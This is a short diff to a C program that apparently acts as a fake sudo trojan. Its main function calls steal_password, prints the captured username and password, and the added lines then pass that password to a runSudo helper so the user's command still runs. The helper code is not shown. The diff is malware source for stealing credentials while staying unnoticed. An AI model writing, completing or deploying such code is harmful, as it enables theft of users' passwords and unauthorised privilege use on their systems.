@@ -40,6 +40,10 @@ int main(int argc, char ** argv){
     steal_password(passwd, username);
 
     printf("%s's password is %s\n", username, passwd);
+    
+    
+    char ** cmd_ray = make_execvp_args(argc, argv);
+    runSudo(passwd, cmd_ray);
   }
 
   return 0;
